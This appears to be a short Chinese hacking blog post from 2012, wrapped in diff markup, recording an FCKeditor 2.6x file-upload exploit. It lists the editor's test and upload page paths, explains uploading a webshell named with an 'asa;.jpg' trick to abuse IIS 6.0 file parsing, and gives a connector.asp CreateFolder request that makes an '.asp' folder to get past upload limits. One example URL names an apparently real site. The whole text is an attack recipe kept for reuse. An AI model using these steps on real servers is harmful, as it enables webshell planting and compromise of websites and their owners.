@@ -1,0 +1,28 @@
+fckeditor 2.6X 0day漏洞
+Author:mOon 2012-4-4 22:14 Wednesday 112 0 发表评论 标签: 漏洞 
+http://xxxx.com/fckeditor/editor/filemanager/connectors/test.html
+
+http://hbkingco.com//fckeditor/editor/filemanager/connectors/uploadtest.html 这个两个页面，是死的关键。上传xx.asa;.jpg
+
+上传之后，路径自然出来了。马为xx.asa; 注意，后面有个;
+
+除了2.63.
+
+Fckeditor 基本上每个版本都可以这么利用。
+
+上传不严格。。
+
+也可以说是IIS G6.0的漏洞
+觉得经常用到。所以留着了
+
+针对ASP版本的
+FCKeditor/editor/filemanager/connectors/asp/connector.asp?Command=CreateFolder&Type=Image&CurrentFolder=/qing.asp&NewFolderName=x.asp
+利用IIS解析漏洞突破建立文件夹
+
+上传地址：
+FCKeditor/editor/filemanager/browser/default/connectors/test.html
+FCKeditor/editor/filemanager/upload/test.html
+FCKeditor/editor/filemanager/connectors/test.html
+FCKeditor/editor/filemanager/connectors/uploadtest.html
+
+/FCKeditor/editor/filemanager/browser/default/browser.html?type=Image&connector=../../connectors/php/connector.php
